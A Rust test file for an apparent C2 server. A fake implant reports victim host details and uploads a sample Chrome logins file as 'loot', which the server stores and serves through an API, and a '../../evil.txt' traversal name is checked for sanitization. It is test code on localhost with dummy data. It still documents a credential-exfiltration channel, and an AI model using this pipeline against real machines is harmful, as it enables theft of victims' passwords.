//! Loot pipeline test: a fake implant uploads `0x03` loot frames, the server
//! persists them, and `/api/loot/*` lists and serves them. Also proves that
//! traversal names are sanitized instead of escaping the session dir.

use std::io::{Read, Write};
use std::time::Duration;

use futures_util::SinkExt;
use tokio_tungstenite::tungstenite::Message;

fn loot_frame(name: &str, data: &[u8]) -> Vec<u8> {
    let mut f = vec![0x03u8];
    f.extend_from_slice(&(name.len() as u16).to_le_bytes());
    f.extend_from_slice(name.as_bytes());
    f.extend_from_slice(data);
    f
}

fn http_get(port: u16, path: &str) -> (u16, Vec<u8>) {
    let mut s = std::net::TcpStream::connect(("127.0.0.1", port)).unwrap();
    write!(
        s,
        "GET {path} HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n"
    )
    .unwrap();
    let mut out = Vec::new();
    s.read_to_end(&mut out).unwrap();
    let split = out
        .windows(4)
        .position(|w| w == b"\r\n\r\n")
        .map(|i| i + 4)
        .unwrap_or(out.len());
    let head = String::from_utf8_lossy(&out[..split]).to_string();
    let code = head
        .lines()
        .next()
        .and_then(|l| l.split_whitespace().nth(1))
        .and_then(|c| c.parse::<u16>().ok())
        .unwrap_or(0);
    (code, out[split..].to_vec())
}

#[tokio::test]
async fn loot_upload_list_download_and_traversal() {
    let port: u16 = 8139;
    let loot_dir = std::env::temp_dir().join(format!("c2loot-{port}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&loot_dir);

    let mut child = std::process::Command::new(env!("CARGO_BIN_EXE_c2-server"))
        .current_dir(env!("CARGO_MANIFEST_DIR"))
        .env("BIND", format!("127.0.0.1:{port}"))
        .env("WEB_DIR", "web")
        .env("LOOT_DIR", &loot_dir)
        .env_remove("C2_TOKEN")
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .expect("spawn server");
    tokio::time::sleep(Duration::from_millis(900)).await;

    let id = "loot-test-1";
    let (mut imp, _) =
        tokio_tungstenite::connect_async(format!("ws://127.0.0.1:{port}/ws/implant"))
            .await
            .expect("implant connect");
    imp.send(Message::Text(
        serde_json::json!({
            "t":"hello","id":id,"host":"LOOTHOST","user":"u","os":"Windows 11",
            "arch":"x64","pid":3,"admin":true,"screen":[800,600]
        })
        .to_string(),
    ))
    .await
    .unwrap();
    tokio::time::sleep(Duration::from_millis(250)).await;

    // ---- upload one loot file ----
    let name = "browsers/chrome__Default__logins.txt";
    let body = b"https://example.test\talice\tcorrect-horse\n";
    imp.send(Message::Binary(loot_frame(name, body)))
        .await
        .unwrap();
    tokio::time::sleep(Duration::from_millis(400)).await;

    // ---- list ----
    let (code, listed) = http_get(port, &format!("/api/loot/{id}"));
    assert_eq!(code, 200, "list status");
    let listed = String::from_utf8_lossy(&listed);
    assert!(listed.contains(name), "list: {listed}");
    assert!(listed.contains("\"size\""), "list: {listed}");

    // ---- download ----
    let (code, got) = http_get(port, &format!("/api/loot/{id}/{name}"));
    assert_eq!(code, 200, "download status");
    assert_eq!(got, body, "downloaded bytes match upload");

    // ---- traversal is stripped, not escaped ----
    imp.send(Message::Binary(loot_frame("../../evil.txt", b"pwn")))
        .await
        .unwrap();
    tokio::time::sleep(Duration::from_millis(400)).await;

    let escaped = loot_dir.join("evil.txt");
    assert!(!escaped.exists(), "traversal escaped the session dir");
    let (code, listed) = http_get(port, &format!("/api/loot/{id}"));
    assert_eq!(code, 200);
    let listed = String::from_utf8_lossy(&listed);
    assert!(listed.contains("evil.txt"), "sanitized name listed: {listed}");
    assert!(!listed.contains(".."), "no traversal in list: {listed}");

    let _ = child.kill();
    let _ = child.wait();
    let _ = std::fs::remove_dir_all(&loot_dir);
}
